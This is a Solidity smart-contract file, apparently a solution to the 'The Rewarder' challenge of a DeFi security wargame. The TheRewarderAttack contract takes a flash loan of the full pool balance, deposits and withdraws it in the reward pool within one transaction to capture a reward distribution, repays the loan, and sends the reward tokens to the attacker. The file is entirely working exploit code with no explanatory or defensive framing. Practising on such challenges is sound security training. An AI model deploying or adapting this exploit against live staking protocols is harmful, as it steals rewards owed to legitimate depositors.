
pragma solidity 0.8.6;


interface FlashLoanerPool {


    function flashLoan(uint256 amount) external;
}

interface TheRewardPool {

    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
}


interface IERC20 {

    function balanceOf(address account) external returns(uint256);
    function transfer(address reciepient,uint256 amount) external;
    function approve(address reciepient,uint256 amount) external;
}

contract TheRewarderAttack {

FlashLoanerPool flashPool;
TheRewardPool rewardPool;
IERC20 LPT;
IERC20 rewardToken;

constructor(FlashLoanerPool _flashLoanerPool,TheRewardPool _theRewarderPool,IERC20 _liquidityToken,IERC20 _rewardToken) {

    flashPool = _flashLoanerPool;
    rewardPool = _theRewarderPool;
    LPT = _liquidityToken;
    rewardToken = _rewardToken;

}



function attack() external {

    // call flashloan with the full amount of the pool balanceof(flahshpool) of the liquidity token DVT
    uint256 amount = 1000000 ether;
    flashPool.flashLoan(amount);

    // send reward tokens to the owner (attacker)
   uint256 my_amount =rewardToken.balanceOf(address(this));
    
    require(my_amount>0);

   rewardToken.transfer(msg.sender, my_amount);
    

}


function receiveFlashLoan(uint256 amount) external {

// when you recive the DVT token , deposit it to the reward Pool
require(amount >= 1000000 ether,"less");
LPT.approve(address(rewardPool), amount);

rewardPool.deposit(amount);
// then withdraw it
rewardPool.withdraw(amount);
// and send it back to the msg.sender (the floashloanpool)
LPT.transfer(address(flashPool), amount);

}




}
